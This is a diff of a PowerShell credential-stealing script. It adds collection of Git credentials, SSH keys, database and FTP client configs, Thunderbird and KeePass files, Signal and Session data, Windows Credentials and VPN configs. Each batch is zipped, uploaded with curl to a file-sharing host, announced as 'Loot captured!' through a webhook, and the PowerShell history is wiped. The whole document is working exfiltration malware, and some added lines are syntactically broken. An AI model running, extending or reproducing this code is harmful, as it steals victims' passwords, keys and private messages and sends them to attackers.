@@ -101,6 +101,53 @@ if (Test-Path "$env:appdata/GitHub Desktop") {
 	Copy-Item "$env:appdata\GitHub Desktop\databases" "$env:tmp/$FolderName/Developing/GithubDesktop/databases" -Recurse
 }
 
+# MavenRepositories
+if (Test-Path "$env:userprofile/.m2") {
+	New-Item -Path "$env:tmp/$FolderName/Developing/MavenRepositories" -ItemType Directory
+	Copy-Item "$env:userprofile/.m2/settings.xml" "$env:tmp/$FolderName/Developing/MavenRepositories/settings.xml"
+	Copy-Item "$env:userprofile/.m2/settings-security.xml" "$env:tmp/$FolderName/Developing/MavenRepositories/settings-security.xml"
+}
+
+# Git
+if (Test-Path "$env:userprofile/.git-credentials" -PathType Any) {
+	New-Item -Path "$env:tmp/$FolderName/Developing/Git" -ItemType Directory
+	Copy-Item "$env:userprofile/.git-credentials" "$env:tmp/$FolderName/Developing/Git/git-credentials"
+}
+if (Test-Path "$env:userprofile/.config/git/credentials" -PathType Any) {
+	New-Item -Path "$env:tmp/$FolderName/Developing/Git" -ItemType Directory
+	Copy-Item "$env:userprofile/.config/git/credentials" "$env:tmp/$FolderName/Developing/Git/credentials"
+}
+if (Test-Path "$env:userprofile/.gitconfig" -PathType Any) {
+	New-Item -Path "$env:tmp/$FolderName/Developing/Git" -ItemType Directory
+	Copy-Item "$env:userprofile/.gitconfig" "$env:tmp/$FolderName/Developing/Git/gitconfig"
+}
+if ([Environment]::GetEnvironmentVariable('XDG_CONFIG_HOME'))
+{
+    if (Test-Path "$env:XDG_CONFIG_HOME/git/credentials" -PathType Any) {
+		New-Item -Path "$env:tmp/$FolderName/Developing/Git" -ItemType Directory
+		Copy-Item "$env:XDG_CONFIG_HOME/git/credentials" "$env:tmp/$FolderName/Developing/Git/xdg_credentials"
+	}
+}
+
+# PHP Composer
+if ([Environment]::GetEnvironmentVariable('COMPOSER_HOME'))
+{
+    if (Test-Path "$env:COMPOSER_HOME/auth.json" -PathType Any) {
+		New-Item -Path "$env:tmp/$FolderName/Developing/Composer" -ItemType Directory
+		Copy-Item "$env:COMPOSER_HOME/auth.json" "$env:tmp/$FolderName/Developing/Composer/home_auth.json"
+	}
+}
+if (Test-Path "$env:appdata/Composer/auth.json" -PathType Any) {
+	New-Item -Path "$env:tmp/$FolderName/Developing/Composer" -ItemType Directory
+	Copy-Item "$env:appdata/Composer/auth.json" "$env:tmp/$FolderName/Developing/Composer/auth.json"
+}
+
+# Tortoise SVN
+if (Test-Path "$env:appdata/Subversion/auth/svn.simple" -PathType Any) {
+	New-Item -Path "$env:tmp/$FolderName/Developing/TortoiseSVN" -ItemType Directory
+	Copy-Item "$env:appdata/Subversion/auth/svn.simple" "$env:tmp/$FolderName/Developing/TortoiseSVN/svn.simple"
+}
+
 Compress-Archive -Path $env:tmp/$FolderName/Developing -DestinationPath "$env:tmp/Developing-$ZIP"
 
 $text = "**Developing**: Loot captured! Here is the URL (It expires in 12 hours): "
@@ -162,24 +209,101 @@ Remove-Item (Get-PSreadlineOption).HistorySavePath
 
 ############################################################################################################################################################
 
-New-Item -Path "$env:tmp/$FolderName/FTPandFileSync" -ItemType Directory
+New-Item -Path "$env:tmp/$FolderName/FTP-FileSync-DB" -ItemType Directory
 
 # FileZilla
 $filezilla = Get-Childitem -Path $env:appdata\FileZilla -Include filezilla.xml -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
 if ($filezilla -ne $null) {
-	Copy-Item "$env:appdata/FileZilla" "$env:tmp/$FolderName/FTPandFileSync/FileZilla" -Recurse
+	Copy-Item "$env:appdata/FileZilla" "$env:tmp/$FolderName/FTP-FileSync-DB/FileZilla" -Recurse
+}
+
+# FileZilla Server
+if (Test-Path "$env:appdata/FileZilla Server/FileZilla Server Interface.xml" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/FTP-FileSync-DB/FileZillaServer -ItemType Directory
+	Copy-Item "$env:appdata/FileZilla Server/FileZilla Server Interface.xml" "$env:tmp/$FolderName/FTP-FileSync-DB/FileZillaServer/ServerInterface.xml"
+}
+
+# SquirrelSQL
+if (Test-Path "$env:appdata/.squirrel-sql/SQLAliases23.xml" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/FTP-FileSync-DB/SquirrelSQL -ItemType Directory
+	Copy-Item "$env:appdata/.squirrel-sql/SQLAliases23.xml" "$env:tmp/$FolderName/FTP-FileSync-DB/SquirrelSQL/SQLAliases23.xml"
+}
+
+# PostgreSQL
+if (Test-Path "$env:appdata/postgresql/pgpass.conf" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/FTP-FileSync-DB/PostgreSQL -ItemType Directory
+	Copy-Item "$env:appdata/postgresql/pgpass.conf" "$env:tmp/$FolderName/FTP-FileSync-DB/PostgreSQL/pgpass.conf"
+}
+
+# DBvisualizer
+if (Test-Path "$env:homepath/.dbvis/config70/dbvis.xml" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/FTP-FileSync-DB/DBvisualizer -ItemType Directory
+	Copy-Item "$env:homepath/.dbvis/config70/dbvis.xml" "$env:tmp/$FolderName/FTP-FileSync-DB/DBvisualizer/dbvis.xml"
+}
+
+
+# Robomongo
+if (Test-Path "$env:userprofile/.config/robomongo" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/FTP-FileSync-DB/Robomongo -ItemType Directory
+	Copy-Item "$env:userprofile/.config/robomongo/robomongo.json" "$env:tmp/$FolderName/FTP-FileSync-DB/Robomongo/robomongo.json"
+}
+if (Test-Path "$env:userprofile/.3T/robo-3t/1.1.1" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/FTP-FileSync-DB/Robomongo -ItemType Directory
+	Copy-Item "$env:userprofile/.3T/robo-3t/1.1.1/robo3t.json" "$env:tmp/$FolderName/FTP-FileSync-DB/Robomongo/robo3t.json"
+}
+
+# SQL Developer
+if (Test-Path "$env:appdata/SQL Developer" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/FTP-FileSync-DB/SQLDeveloper -ItemType Directory
+	Copy-Item "$env:appdata/SQL Developer/product-preferences.xml" "$env:tmp/$FolderName/FTP-FileSync-DB/SQLDeveloper/product-preferences.xml"
+	Copy-Item "$env:appdata/SQL Developer/connections.xml" "$env:tmp/$FolderName/FTP-FileSync-DB/SQLDeveloper/connections.xml"
+}
+
+# ApacheDirectoryStudio
+if (Test-Path "$env:userprofile\.ApacheDirectoryStudio\.metadata\.plugins\org.apache.directory.studio.connection.core\connections.xml" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/FTP-FileSync-DB/ApacheDirectoryStudio -ItemType Directory
+	Copy-Item "$env:userprofile\.ApacheDirectoryStudio\.metadata\.plugins\org.apache.directory.studio.connection.core\connections.xml" "$env:tmp/$FolderName/FTP-FileSync-DB/ApacheDirectoryStudio/connections.xml"
+}
+
+# CoreFTP
+if (Test-Path "HKCU:\Software\FTPware\CoreFTP\Sites" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/FTP-FileSync-DB/CoreFTP -ItemType Directory
+	Get-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\Software\FTPware\CoreFTP\Sites > $env:tmp/$FolderName/FTP-FileSync-DB/CoreFTP/data.txt
+}
+
+# Cyberduck
+if (Test-Path "$env:appdata/Cyberduck" -PathType Any) {
+	$userconf = Get-Childitem -Path $env:appdata\Cyberduck -Include user.config -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
+	New-Item -Path $env:tmp/$FolderName/FTP-FileSync-DB/Cyberduck -ItemType Directory
+	Get-Content $userconf > $env:tmp/$FolderName/FTP-FileSync-DB/Cyberduck/user.config
+}
+
+# FTP Navigator
+if (Test-Path "$env:homedrive/FTP Navigator/Ftplist.txt" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/FTP-FileSync-DB/FTPNavigator -ItemType Directory
+	Copy-Item "$env:homedrive/FTP Navigator/Ftplist.txt" "$env:tmp/$FolderName/FTP-FileSync-DB/FTPNavigator/Ftplist.txt"
+}
+
+# PuTTY Connection Manager
+if (Test-Path "HKCU:\Software\ACS\PuTTY Connection Manager" -PathType Any) {
+	$dbpath = Get-ItemProperty -Path "HKCU:\Software\ACS\PuTTY Connection Manager"
+	$dbpath = $dbpath | Select-Object DefaultDatabase | Out-String
+	if (Test-Path $dbpath) {
+		New-Item -Path $env:tmp/$FolderName/FTP-FileSync-DB/PCM -ItemType Directory
+		Copy-Item $dbpath "$env:tmp/$FolderName/PCM/" -Recurse
+	}
 }
 
 # SyncThing
 if (Test-Path "$env:appdata/../Local/Syncthing/" -PathType Any) {
-	New-Item -Path $env:tmp/$FolderName/FTPandFileSync/Syncthing -ItemType Directory
-	Copy-Item "$env:appdata/../Local/Syncthing" "$env:tmp/$FolderName/FTPandFileSync/Syncthing" -Recurse
+	New-Item -Path $env:tmp/$FolderName/FTP-FileSync-DB/Syncthing -ItemType Directory
+	Copy-Item "$env:appdata/../Local/Syncthing" "$env:tmp/$FolderName/FTP-FileSync-DB/Syncthing" -Recurse
 }
 
-Compress-Archive -Path $env:tmp/$FolderName/FTPandFileSync -DestinationPath "$env:tmp/FTPandFileSync-$ZIP"
+Compress-Archive -Path $env:tmp/$FolderName/FTP-FileSync-DB -DestinationPath "$env:tmp/FTP-FileSync-DB-$ZIP"
 
-$text = "**FTPandFileSync**: Loot captured! Here is the URL (It expires in 12 hours): "
-$text += curl.exe -F "reqtype=fileupload" -F "time=12h" -F "fileToUpload=@$env:tmp/FTPandFileSync-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
+$text = "**FTP-FileSync-DB**: Loot captured! Here is the URL (It expires in 12 hours): "
+$text += curl.exe -F "reqtype=fileupload" -F "time=12h" -F "fileToUpload=@$env:tmp/FTP-FileSync-DB-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
 
 $hookurl = "$dc"
 
@@ -190,8 +314,8 @@ $Body = @{
 
 Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
 
-Remove-Item "$env:TEMP\$FolderName\FTPandFileSync" -r -Force -ErrorAction SilentlyContinue
-Remove-Item "$env:TEMP\FTPandFileSync-$ZIP" -r -Force -ErrorAction SilentlyContinue
+Remove-Item "$env:TEMP\$FolderName\FTP-FileSync-DB" -r -Force -ErrorAction SilentlyContinue
+Remove-Item "$env:TEMP\FTP-FileSync-DB-$ZIP" -r -Force -ErrorAction SilentlyContinue
 
 # Delete powershell history periodically
 
@@ -212,6 +336,10 @@ if (Test-Path "$env:appdata\..\Local\TeamViewer\Logs" -PathType Any) {
 	New-Item -Path $env:tmp/$FolderName/RemoteControl/TeamViewer -ItemType Directory
 	Copy-Item "$env:appdata/../Local/TeamViewer/Logs" "$env:tmp/$FolderName/RemoteControl/TeamViewer/Logs" -Recurse
 }
+if (Test-Path "$env:appdata\..\Local\TeamViewer\TeamViewer15_Logfile.log" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/RemoteControl/TeamViewer -ItemType Directory
+	Copy-Item "$env:appdata/../Local/TeamViewer/TeamViewer15_Logfile.log" "$env:tmp/$FolderName/RemoteControl/TeamViewer/TeamViewer15_Logfile.log"
+}
 
 # AnyDesk
 if (Test-Path "$env:appdata\AnyDesk\connection_trace.txt" -PathType Any) {
@@ -223,6 +351,22 @@ if (Test-Path "$env:appdata\AnyDesk\connection_trace.txt" -PathType Any) {
 if (Test-Path "$env:appdata/Parsec/log.txt" -PathType Any) {
 	New-Item -Path $env:tmp/$FolderName/RemoteControl/Parsec -ItemType Directory
 	Copy-Item "$env:appdata/Parsec/log.txt" "$env:tmp/$FolderName/RemoteControl/Parsec/log.txt"
+}
+
+# OpenSSH
+if (Test-Path "$env:userprofile/.ssh" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/RemoteControl/SSH -ItemType Directory
+	Copy-Item "$env:userprofile/.ssh" "$env:tmp/$FolderName/RemoteControl/SSH" -Recurse
+}
+
+# RDCMan
+if (Test-Path "$env:localappdata/Microsoft/Remote Desktop Connection Manager/RDCMan.settings" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/RemoteControl/RDCMan -ItemType Directory
+	Copy-Item "$env:localappdata/Microsoft/Remote Desktop Connection Manager/RDCMan.settings" "$env:tmp/$FolderName/RemoteControl/RDCMan/MS/" -Recurse
+}
+if (Test-Path "$env:localappdata/Microsoft Corporation/Remote Desktop Connection Manager/RDCMan.settings" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/RemoteControl/RDCMan -ItemType Directory
+	Copy-Item "$env:localappdata/Microsoft Corporation/Remote Desktop Connection Manager/RDCMan.settings" "$env:tmp/$FolderName/RemoteControl/RDCMan/MSC/" -Recurse
 }
 
 Compress-Archive -Path $env:tmp/$FolderName/RemoteControl -DestinationPath "$env:tmp/RemoteControl-$ZIP"
@@ -570,61 +714,103 @@ Remove-Item (Get-PSreadlineOption).HistorySavePath
 
 ############################################################################################################################################################
 
-New-Item -Path "$env:tmp/$FolderName/Socials" -ItemType Directory
+New-Item -Path "$env:tmp/$FolderName/SocialsAndEntertainment" -ItemType Directory
 
 # Telegram
 if (Test-Path "$env:appdata/Telegram Desktop/log.txt" -PathType Any) {
-	New-Item -Path $env:tmp/$FolderName/Socials/Telegram -ItemType Directory
-	Copy-Item "$env:appdata/Telegram Desktop/log.txt" "$env:tmp\$FolderName\Socials\Telegram\log.txt"
+	New-Item -Path $env:tmp/$FolderName/SocialsAndEntertainment/Telegram -ItemType Directory
+	Copy-Item "$env:appdata/Telegram Desktop/log.txt" "$env:tmp\$FolderName\SocialsAndEntertainment\Telegram\log.txt"
 }
 if (Test-Path "$env:appdata/Telegram Desktop/tdata" -PathType Any) {
-	New-Item -Path $env:tmp/$FolderName/Socials/Telegram -ItemType Directory
-	Copy-Item "$env:appdata/Telegram Desktop/tdata" "$env:tmp\$FolderName\Socials\Telegram\tdata" -recurse
+	New-Item -Path $env:tmp/$FolderName/SocialsAndEntertainment/Telegram -ItemType Directory
+	Copy-Item "$env:appdata/Telegram Desktop/tdata" "$env:tmp\$FolderName\SocialsAndEntertainment\Telegram\tdata" -recurse
 }
 
 # Keybase
 if (Test-Path "$env:appdata/../Local/Keybase/config.json" -PathType Any) {
-	New-Item -Path $env:tmp/$FolderName/Socials/Keybase -ItemType Directory
-	Copy-Item "$env:appdata/../Local/Keybase/config.json" "$env:tmp/$FolderName/Socials/Keybase/config.json"
+	New-Item -Path $env:tmp/$FolderName/SocialsAndEntertainment/Keybase -ItemType Directory
+	Copy-Item "$env:appdata/../Local/Keybase/config.json" "$env:tmp/$FolderName/SocialsAndEntertainment/Keybase/config.json"
+}
+
+# Pidgin
+if (Test-Path "$env:appdata/.purple/accounts.xml" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/SocialsAndEntertainment/Pidgin -ItemType Directory
+	Copy-Item "$env:appdata/.purple/accounts.xml" "$env:tmp/$FolderName/SocialsAndEntertainment/Pidgin/accounts.xml"
+}
+
+# PSI
+if (Test-Path "$env:appdata/psi/profiles" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/SocialsAndEntertainment/Pidgin -ItemType Directory
+	Copy-Item "$env:appdata/psi/profiles" "$env:tmp/$FolderName/SocialsAndEntertainment/PSI/" -recurse
 }
 
 # Session
 if (Test-Path "$env:appdata/Session") {
-	New-Item -Path "$env:tmp/$FolderName/Socials/Session" -ItemType Directory
-	Copy-Item "$env:appdata\Session\Cookies" "$env:tmp/$FolderName/Socials/Session/Cookies"
-	Copy-Item "$env:appdata\Session\Local State" "$env:tmp/$FolderName/Socials/Session/Local State"
-	Copy-Item "$env:appdata\Session\Preferences" "$env:tmp/$FolderName/Socials/Session/Preferences"
-	Copy-Item "$env:appdata\Session\Local Storage\leveldb" "$env:tmp/$FolderName/Socials/Session/Local Storage/leveldb" -Recurse
-	Copy-Item "$env:appdata\Session\Session Storage" "$env:tmp/$FolderName/Socials/Session/Session Storage" -Recurse
-	Copy-Item "$env:appdata\Session\databases" "$env:tmp/$FolderName/Socials/Session/databases" -Recurse
+	New-Item -Path "$env:tmp/$FolderName/SocialsAndEntertainment/Session" -ItemType Directory
+	Copy-Item "$env:appdata\Session\Cookies" "$env:tmp/$FolderName/SocialsAndEntertainment/Session/Cookies"
+	Copy-Item "$env:appdata\Session\Local State" "$env:tmp/$FolderName/SocialsAndEntertainment/Session/Local State"
+	Copy-Item "$env:appdata\Session\Preferences" "$env:tmp/$FolderName/SocialsAndEntertainment/Session/Preferences"
+	Copy-Item "$env:appdata\Session\Local Storage\leveldb" "$env:tmp/$FolderName/SocialsAndEntertainment/Session/Local Storage/leveldb" -Recurse
+	Copy-Item "$env:appdata\Session\Session Storage" "$env:tmp/$FolderName/SocialsAndEntertainment/Session/Session Storage" -Recurse
+	Copy-Item "$env:appdata\Session\databases" "$env:tmp/$FolderName/SocialsAndEntertainment/Session/databases" -Recurse
 }
 
 # Signal
 if (Test-Path "$env:appdata/Signal") {
-	New-Item -Path "$env:tmp/$FolderName/Socials/Signal" -ItemType Directory
-	Copy-Item "$env:appdata\Signal\Cookies" "$env:tmp/$FolderName/Socials/Signal/Cookies"
-	Copy-Item "$env:appdata\Signal\Local State" "$env:tmp/$FolderName/Socials/Signal/Local State"
-	Copy-Item "$env:appdata\Signal\Preferences" "$env:tmp/$FolderName/Socials/Signal/Preferences"
-	Copy-Item "$env:appdata\Signal\Local Storage\leveldb" "$env:tmp/$FolderName/Socials/Signal/Local Storage/leveldb" -Recurse
-	Copy-Item "$env:appdata\Signal\Session Storage" "$env:tmp/$FolderName/Socials/Signal/Session Storage" -Recurse
-	Copy-Item "$env:appdata\Signal\databases" "$env:tmp/$FolderName/Socials/Signal/databases" -Recurse
+	New-Item -Path "$env:tmp/$FolderName/SocialsAndEntertainment/Signal" -ItemType Directory
+	Copy-Item "$env:appdata\Signal\Cookies" "$env:tmp/$FolderName/SocialsAndEntertainment/Signal/Cookies"
+	Copy-Item "$env:appdata\Signal\Local State" "$env:tmp/$FolderName/SocialsAndEntertainment/Signal/Local State"
+	Copy-Item "$env:appdata\Signal\Preferences" "$env:tmp/$FolderName/SocialsAndEntertainment/Signal/Preferences"
+	Copy-Item "$env:appdata\Signal\Local Storage\leveldb" "$env:tmp/$FolderName/SocialsAndEntertainment/Signal/Local Storage/leveldb" -Recurse
+	Copy-Item "$env:appdata\Signal\Session Storage" "$env:tmp/$FolderName/SocialsAndEntertainment/Signal/Session Storage" -Recurse
+	Copy-Item "$env:appdata\Signal\databases" "$env:tmp/$FolderName/SocialsAndEntertainment/Signal/databases" -Recurse
 }
 
 # Tutanota
 if (Test-Path "$env:appdata/tutanota-desktop") {
-	New-Item -Path "$env:tmp/$FolderName/Socials/Tutanota" -ItemType Directory
-	Copy-Item "$env:appdata\tutanota-desktop\Cookies" "$env:tmp/$FolderName/Socials/Tutanota/Cookies"
-	Copy-Item "$env:appdata\tutanota-desktop\Local State" "$env:tmp/$FolderName/Socials/Tutanota/Local State"
-	Copy-Item "$env:appdata\tutanota-desktop\Preferences" "$env:tmp/$FolderName/Socials/Tutanota/Preferences"
-	Copy-Item "$env:appdata\tutanota-desktop\Local Storage\leveldb" "$env:tmp/$FolderName/Socials/Tutanota/Local Storage/leveldb" -Recurse
-	Copy-Item "$env:appdata\tutanota-desktop\Session Storage" "$env:tmp/$FolderName/Socials/Tutanota/Session Storage" -Recurse
-	Copy-Item "$env:appdata\tutanota-desktop\databases" "$env:tmp/$FolderName/Socials/Tutanota/databases" -Recurse
+	New-Item -Path "$env:tmp/$FolderName/SocialsAndEntertainment/Tutanota" -ItemType Directory
+	Copy-Item "$env:appdata\tutanota-desktop\Cookies" "$env:tmp/$FolderName/SocialsAndEntertainment/Tutanota/Cookies"
+	Copy-Item "$env:appdata\tutanota-desktop\Local State" "$env:tmp/$FolderName/SocialsAndEntertainment/Tutanota/Local State"
+	Copy-Item "$env:appdata\tutanota-desktop\Preferences" "$env:tmp/$FolderName/SocialsAndEntertainment/Tutanota/Preferences"
+	Copy-Item "$env:appdata\tutanota-desktop\Local Storage\leveldb" "$env:tmp/$FolderName/SocialsAndEntertainment/Tutanota/Local Storage/leveldb" -Recurse
+	Copy-Item "$env:appdata\tutanota-desktop\Session Storage" "$env:tmp/$FolderName/SocialsAndEntertainment/Tutanota/Session Storage" -Recurse
+	Copy-Item "$env:appdata\tutanota-desktop\databases" "$env:tmp/$FolderName/SocialsAndEntertainment/Tutanota/databases" -Recurse
 }
 
-Compress-Archive -Path $env:tmp/$FolderName/Socials -DestinationPath "$env:tmp/Socials-$ZIP"
+# Thunderbird
+$key4 = Get-Childitem -Path $env:appdata\Thunderbird\Profiles\ -Include key4.db -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
+if($key4 -ne $null){
+taskkill /IM thunderbird.exe /F
+Start-Sleep 1
+New-Item -Path $env:tmp/$FolderName/SocialsAndEntertainment/Thunderbird -ItemType Directory
+Get-Content $key4 > $env:TMP\$FolderName\SocialsAndEntertainment\Thunderbird\key4.db
+Get-Childitem -Path $env:appdata\Thunderbird\Profiles\ -Include logins.json -Recurse -ErrorAction SilentlyContinue | Get-Content -Path { $_.fullname } | Write-Output > $env:TMP\$FolderName\SocialsAndEntertainment\Thunderbird\logins.json
+Get-Childitem -Path $env:appdata\Thunderbird\Profiles\ -Include cookies.sqlite -Recurse -ErrorAction SilentlyContinue | Get-Content -Path { $_.fullname } | Write-Output > $env:TMP\$FolderName\SocialsAndEntertainment\Thunderbird\cookies.sqlite
+Get-Childitem -Path $env:appdata\Thunderbird\Profiles\ -Include downloads.json -Recurse -ErrorAction SilentlyContinue | Get-Content -Path { $_.fullname } | Write-Output > $env:TMP\$FolderName\SocialsAndEntertainment\Thunderbird\downloads.json
+Get-Childitem -Path $env:appdata\Thunderbird\Profiles\ -Include profile.ini -Recurse -ErrorAction SilentlyContinue | Get-Content -Path { $_.fullname } | Write-Output > $env:TMP\$FolderName\SocialsAndEntertainment\Thunderbird\profile.ini
+Get-Childitem -Path $env:appdata\Thunderbird\Profiles\ -Include places.sqlite -Recurse -ErrorAction SilentlyContinue | Get-Content -Path { $_.fullname } | Write-Output > $env:TMP\$FolderName\SocialsAndEntertainment\Thunderbird\places.sqlite
+Get-Childitem -Path $env:appdata\Thunderbird\Profiles\ -Include webappsstore.sqlite -Recurse -ErrorAction SilentlyContinue | Get-Content -Path { $_.fullname } | Write-Output > $env:TMP\$FolderName\SocialsAndEntertainment\Thunderbird\webappsstore.sqlite
+Get-Childitem -Path $env:appdata\Thunderbird\Profiles\ -Include storage.sqlite -Recurse -ErrorAction SilentlyContinue | Get-Content -Path { $_.fullname } | Write-Output > $env:TMP\$FolderName\SocialsAndEntertainment\Thunderbird\storage.sqlite
+Get-Childitem -Path $env:appdata\Thunderbird\Profiles\ -Include "storage-sync-v2.sqlite" -Recurse -ErrorAction SilentlyContinue | Get-Content -Path { $_.fullname } | Write-Output > $env:TMP\$FolderName\SocialsAndEntertainment\Thunderbird\storage-sync-v2
+}
 
-$text = "**Socials**: Loot captured! Here is the URL (It expires in 12 hours): "
-$text += curl.exe -F "reqtype=fileupload" -F "time=12h" -F "fileToUpload=@$env:tmp/Socials-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
+# Spotify
+if (Test-Path "$env:appdata/Spotify/Users") {
+	New-Item -Path "$env:tmp/$FolderName/SocialsAndEntertainment/Spotify" -ItemType Directory
+	Copy-Item "$env:appdata\Spotify\Users" "$env:tmp/$FolderName/SocialsAndEntertainment/Spotify" -Recurse
+}
+
+# Zoom
+if (Test-Path "$env:appdata/Zoom/data") {
+	New-Item -Path "$env:tmp/$FolderName/SocialsAndEntertainment/Zoom" -ItemType Directory
+	Copy-Item "$env:appdata\Zoom\data" "$env:tmp/$FolderName/SocialsAndEntertainment/Zoom" -Recurse
+}
+
+
+Compress-Archive -Path $env:tmp/$FolderName/Socials -DestinationPath "$env:tmp/SocialsAndEntertainment-$ZIP"
+
+$text = "**SocialsAndEntertainment**: Loot captured! Here is the URL (It expires in 12 hours): "
+$text += curl.exe -F "reqtype=fileupload" -F "time=12h" -F "fileToUpload=@$env:tmp/SocialsAndEntertainment-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
 
 $hookurl = "$dc"
 
@@ -635,8 +821,8 @@ $Body = @{
 
 Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
 
-Remove-Item "$env:TEMP\$FolderName\Socials" -r -Force -ErrorAction SilentlyContinue
-Remove-Item "$env:TEMP\Socials-$ZIP" -r -Force -ErrorAction SilentlyContinue
+Remove-Item "$env:TEMP\$FolderName\SocialsAndEntertainment" -r -Force -ErrorAction SilentlyContinue
+Remove-Item "$env:TEMP\SocialsAndEntertainment-$ZIP" -r -Force -ErrorAction SilentlyContinue
 
 # Delete powershell history periodically
 
@@ -737,6 +923,34 @@ $path = get-SteamPath
 if ($path -ne $null) {
 	New-Item -Path $env:tmp/$FolderName/Gaming/Steam -ItemType Directory
 	Copy-Item "$path/config" "env:tmp/$FolderName/Gaming/Steam/config" -Recurse
+}
+
+# Turba
+
+if (Test-Path "$path/steamapps/common/Turba/Assets/Settings.bin" - PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/Gaming/Turba -ItemType Directory
+	Copy-Item "$path/steamapps/common/Turba/Assets/Settings.bin" "$env:tmp/$FolderName/Gaming/Turba/Settings.bin"
+}
+
+# GalconFusion
+
+foreach($file in Get-ChildItem "$path/userdata"){
+	if (Test-Path "$path/userdata/$_.FullName/44200/remote/galcon.cfg" - PathType Any) {
+		New-Item -Path $env:tmp/$FolderName/Gaming/GalconFusion/$_.FullName -ItemType Directory
+		Copy-Item "$path/userdata/$_.FullName/44200/remote/galcon.cfg" "$env:tmp/$FolderName/Gaming/GalconFusion/$_.FullName/galcon.cfg"
+	}
+}
+
+# Kalypso Media
+if (Test-Path "$env:appdata/Kalypso Media/Launcher/launcher.ini" - PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/Gaming/KalypsoMedia -ItemType Directory
+	Copy-Item "$env:appdata/Kalypso Media/Launcher/launcher.ini" "$env:tmp/$FolderName/Gaming/KalypsoMedia/launcher.ini"
+}
+
+# Rogue's Tale
+if (Test-Path "$env:userprofile/Documents/Rogue's Tale/users" - PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/Gaming/RoguesTale -ItemType Directory
+	Copy-Item "$env:userprofile/Documents/Rogue's Tale/users" "$env:tmp/$FolderName/Gaming/RoguesTale/"
 }
 
 # Fortnite
@@ -874,6 +1088,10 @@ if (Test-Path "$env:appdata/OpenVPN Connect/profiles" -PathType Any) {
 	New-Item -Path $env:tmp/$FolderName/VPN/OpenVPN -ItemType Directory
 	Copy-Item "$env:appdata/OpenVPN Connect/profiles" "env:tmp/$FolderName/VPN/OpenVPN" -Recurse
 }
+if (Test-Path "HKCU:\Software\OpenVPN-GUI\Configs" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/VPN/OpenVPN -ItemType Directory
+	Get-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\Software\OpenVPN-GUI\Configs > $env:tmp/$FolderName/VPN/OpenVPN/Configs.txt
+}
 
 Compress-Archive -Path $env:tmp/$FolderName/VPN -DestinationPath "$env:tmp/VPN-$ZIP"
 
@@ -930,8 +1148,8 @@ Remove-Item (Get-PSreadlineOption).HistorySavePath
 
 ############################################################################################################################################################
 
-function Get-fullName {
 
+function Get-fullName {
     try {
     $fullName = (Get-LocalUser -Name $env:USERNAME).FullName
     }
@@ -1116,6 +1334,28 @@ $pcinfo=Get-ComputerInfo > $env:TEMP\$FolderName/computerInfoFormatted.txt
 
 ############################################################################################################################################################
 
+# Credentials Folder
+if (Test-Path "$env:appdata/Microsoft/Credentials" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/Credentials/Microsoft -ItemType Directory
+	Copy-Item "$env:appdata/Microsoft/Credentials" "$env:tmp/$FolderName/Credentials/Microsoft" -Recurse
+}
+
+#Keepass
+if (Test-Path "$env:appdata/KeePass/KeePass.ini" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/Credentials/Keepass -ItemType Directory
+	Copy-Item "$env:appdata/KeePass/KeePass.ini" "$env:tmp/$FolderName/Credentials/Keepass/KeePass.ini" -Recurse
+}
+if (Test-Path "$env:appdata/KeePass/KeePass.config.xml" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/Credentials/Keepass -ItemType Directory
+	Copy-Item "$env:appdata/KeePass/KeePass.config.xml" "$env:tmp/$FolderName/Credentials/Keepass/KeePass.config.xml" -Recurse
+}
+if (Test-Path "$env:appdata/KeePassXC/keepassxc.ini" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/Credentials/Keepass -ItemType Directory
+	Copy-Item "$env:appdata/KeePassXC/keepassxc.ini" "$env:tmp/$FolderName/Credentials/Keepass/keepassxc.ini" -Recurse
+}
+
+############################################################################################################################################################
+
 $ScheduledTasks = Get-ScheduledTask
 
 ############################################################################################################################################################
@@ -1177,6 +1417,9 @@ $drivers=Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $nu
 
 # videocard
 $videocard=Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, DriverVersion, CurrentHorizontalResolution, CurrentVerticalResolution | Out-String -width 250
+
+# environment
+$env=dir env:
 
 
 ############################################################################################################################################################
@@ -1322,6 +1565,11 @@ $software
 
 Drivers: 
 $drivers
+
+------------------------------------------------------------------------------------------------------------------------------
+
+Environment:
+$env
 
 ------------------------------------------------------------------------------------------------------------------------------
 
@@ -1508,7 +1756,7 @@ $key4 = Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include key4
 if($key4 -ne $null){
